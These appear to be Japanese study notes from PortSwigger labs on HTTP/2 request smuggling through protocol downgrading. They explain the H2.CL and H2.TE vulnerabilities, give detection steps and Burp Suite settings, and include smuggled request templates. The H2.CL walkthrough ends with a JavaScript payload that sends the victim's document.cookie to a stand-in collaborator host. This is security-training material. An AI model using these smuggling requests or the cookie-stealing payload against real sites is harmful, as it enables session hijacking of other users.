###### HTTP/2もHRSの危険性がある理由

- HRSはフロントエンドサーバとバックエンドサーバのリクエスト長の解釈の不一致によって起きる
- HTTP/2の場合、不一致は起きないなのでHRSに対して安全
- しかし、[1. HTTP2 request smuggling](1.%20HTTP2%20request%20smuggling.md#HTTP/2%20downgrading)によってHRSが可能になる！

## HTTP/2 downgrading

![[Pasted image 20240129160253.png | 300]]
###### HTTP/2 downgrading とは

- HTTP/2をHTTP/1のシンタックスに書き換えるプロセスのこと
- フロントエンドサーバが、HTTP/1しかサポートしていないバックエンドサーバと通信するために行うプロセス。
- レスポンス時はバックエンドからのHTTP/1通信をフロントエンドにてHTTP/2に書き換えてユーザに返す
- 
- これは==HTTP/2 request smugglingにおいての悪用で多くの攻撃の前提条件==

#### ダウングレードが可能な理由

- プロトコルの各バージョンが基本的に同じ情報を異なる方法で表現しているに過ぎないから。
- HTTP/1 メッセージの各項目は、HTTP/2 においてほぼ等価である
- 2つのプロトコル間での変更は簡単(だからBurp SuiteではHTTP/2もHTTP/1の形式で表現している)
- ダウングレードはリバースプロキシのデフォルトの動作であることもある。無効にするオプションすらない場合もある
![[Pasted image 20240129160634.png]]
###### HTTP/2の説明上の注意点

- HTTP/2は実際バイナリプロトコルなので、上の図のように読めるものではない
- HTTP/2専用の「擬似ヘッダ」には`:`を付与して説明している([2. HTTP2専用のベクターとCRLF注入によるHRS](2.%20HTTP2専用のベクターとCRLF注入によるHRS.md#擬似ヘッダの種類))

## H2.CL / H2.TE脆弱性(手動検出・悪用)

##### 重要

- もしH2.CL、またはH2.TL脆弱性がある場合、[4. HRS脆弱性の悪用](../4.%20HRS脆弱性の悪用.md)と同じ手法が使える
- ⭐️HTTP Request Smuggler-> HTTP/2 probeでH2.TE脆弱性は検出できる。つまり、検出できなかったらH2.CLである。
- ⭐️H2.TE脆弱性はHTTP Request Smugglerで悪用が可能。H2.CL脆弱性は現実世界でほとんど無いので自動悪用不可能

### H2.CL脆弱性

###### 基本概念

- HTTP/2リクエスト内で`content-length`ヘッダを指定し、しかも、その長さが検証されない時、HRS脆弱性になる
- HTTP/2でデフォルトで保持している正確なリクエスト長よりも、==HTTP/2リクエスト上で明示された`content-length`をHTTP/1は優先する==

フロントエンド(HTTP/2)
![[Pasted image 20240129162211.png | 400]]
- 上部がHTTP/2で下部が密輸したHTTP/1リクエスト

バックエンド(HTTP/1)
```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10 //重要

x=1GET / H
```

###### H2.CLのTip

- `Content-Length`の値は、==body(`x=1`)の長さより少しだけ大きい値を指定する==
- これにより、攻撃者が密輸したリクエストが正しく処理される
- 同じ接続を使用した被害者のリクエストが`GET / H`で区切られ、攻撃者の密輸リクエストがバックエンドに正しく解釈される
	- "Dupulicate header error"(重複ヘッダーエラー)回避のため
	- つまり被害者のリクエストのヘッダが攻撃を邪魔するのを防ぐため。被害者のリクエストのヘッダを含む前に切り捨てる。

#### H2.CL悪用ステップ

- 目的：エクスプロイトサーバのファイルを被害者に実行させる

###### 1. H2.CL検出ステップ

1. `GET /`リクエストをRepeaterへ。[1. HTTP2 request smuggling](1.%20HTTP2%20request%20smuggling.md#HTTP/2%20HRS%20設定)へ変更する
2. Change Request MethodでPOSTへ変更し不要なヘッダを削除し何度かリクエスト(`SMUGGLED`のままでよい)
```http
POST / HTTP/2
Host: example
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

SMUGGLED
```
3. 404エラー？
	- YES -> H2.CL脆弱性の検出
	- NO -> H2.TE脆弱性

###### 2.密輸するリクエストを選定する。

- 外部リソースの読み込みは狙い目
- 読み込まれるリソースのファイル名を削除しディレクトリ名の後の`/`を削除する
	- 例：`/resouces/js/~` -> `/resouces`
	- 💡[4. HRS脆弱性の悪用](../4.%20HRS脆弱性の悪用.md#on-site%20redirectの基本)にあるように、こうするとon-siteリダイレクトされるかわかる

###### 3. リクエストを密輸する。

- `Content-Length:`の値はbody部(`x=1`)のバイト数より少し大きくすること([1. HTTP2 request smuggling](1.%20HTTP2%20request%20smuggling.md#H2.CLのTip))
```http
POST / HTTP/2
Host: [target-hostname]
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: EXPLOIT_DOMAIN
Content-Length: 5

x=1
```
- ↓レスポンス：`Host`ヘッダの値がリダイレクト先のホスト名に反映されていることを確かめる
```http
HTTP/2 302 Found
Location: https://EXPLOIT_DOMAIN/resources/
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

###### 4.同じディレクトリ名でエクスプロイトサーバに悪意あるスクリプトをホストする

```
/resources
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

document.location='https://COLLABORATOR_DOMAIN/?cookies='+document.cookie;
```
- [LAB](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

### H2.TE脆弱性

###### 基本概念

- `transfer-encoding: chunked`がHTTP/2で排除されず、HTTP/1のバックエンドサーバがサポートしている時にダウングレードすると悪用可能になる
	- デフォルトでは推奨されない

フロントエンド(HTTP/2)
![[Pasted image 20240130103930.png | 300]]

バックエンド(HTTP/1)
```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

#### H2.TE悪用ステップ

1. `/`へのGETリクエストをRepeaterへ。設定を変更([1. HTTP2 request smuggling](1.%20HTTP2%20request%20smuggling.md#HTTP/2%20HRS%20設定))
2. Change Request MethodでPOSTへ変更し、不要なヘッダを削除してH2.TE脆弱性を検出
```http
POST / HTTP/2
Host: [target-hostname]
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

SMUGGLED
```

3. [4. HRS脆弱性の悪用](../4.%20HRS脆弱性の悪用.md)を参考に、リクエストを密輸して悪用する

### Hidden HTTP/2 support

- Burp Suite等はフロントエンドサーバがHTTP/2をサポートしていても、HTTP/1のバックエンドと通信するとき、自動的にフロントエンドもHTTP/1へ変更してしまう。
- ダウングレードによる悪用ができなくなってしまう

- 悪用可能なHTTP/2の設定を見逃さないように、==HTTP/2のHRS時には以下の設定を行う==
- 💡Scannerは自動で隠されたHTTP/2を検出する

###### HTTP/2 HRS 設定

- Change Request attributeでHTTP/2を選択
- Update Content-Lengthからチェックを外す
- Allow HTTP/2 ALPN overrideにチェックをいれる
- 必要であれば：\\nをクリックして`\r\n`を表示(HTTP/1でも使うが)
